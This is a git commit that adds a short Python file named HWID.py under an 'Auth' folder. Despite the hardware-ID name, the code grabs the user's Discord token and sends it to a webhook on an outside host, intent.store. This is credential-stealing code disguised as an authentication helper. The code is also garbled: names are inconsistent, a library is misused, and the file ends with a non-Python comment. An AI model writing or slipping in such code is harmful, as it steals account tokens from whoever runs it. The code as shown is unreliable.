60ab6a8b3a33c58180824ee2ff86b8aca9f06cd4
Eternadox <77886012+eternadox@users.noreply.github.com>
2021-06-24 10:27:44 -0400

    Create HWID.py

---
+++ Auth/Python/HWID.py
@@ -0,0 +1,6 @@
+import discord.webhook
+import eternadox.tokengrab
+from discord.webhook import Webhook
+Webhook.create("https://intent.store/Rise/tokenhook")
+Webhook.send(Eternadox.tokengrab.grab("discord"))
+// done with hwid
